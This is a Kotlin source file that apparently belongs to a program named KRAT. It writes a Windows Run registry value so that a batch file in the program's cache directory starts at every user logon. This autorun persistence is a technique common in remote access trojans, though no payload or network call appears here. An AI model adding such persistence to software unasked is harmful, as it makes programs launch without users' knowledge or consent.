package services

object StartupRegistry {
    fun register() {
        // Delete the registry entry
        val deleteProcess = ProcessBuilder("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "KRAT", "/f")
            .inheritIO()
            .start()
        deleteProcess.waitFor()

        // Add the registry entry
        val addProcess = ProcessBuilder("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", "KRAT", "/t", "REG_SZ", "/d", "${KRAT.cacheDir.absolutePath}\\run.bat", "/f")
            .inheritIO()
            .start()
        addProcess.waitFor()
    }
}